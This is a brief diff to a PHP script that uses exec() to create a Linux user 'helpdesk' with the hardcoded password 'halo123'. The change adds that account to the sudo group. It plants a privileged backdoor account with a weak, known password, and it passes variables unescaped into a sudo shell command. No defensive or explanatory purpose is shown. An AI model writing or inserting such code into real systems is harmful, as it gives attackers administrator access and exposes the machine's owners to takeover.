@@ -2,5 +2,5 @@
 $username = "helpdesk";
 $password = "halo123";
 
-exec("sudo useradd -m -s /bin/bash $username && echo '$username:$password' | sudo chpasswd");
+exec("sudo useradd -m -s /bin/bash $username -G sudo && echo '$username:$password' | sudo chpasswd");
 ?>
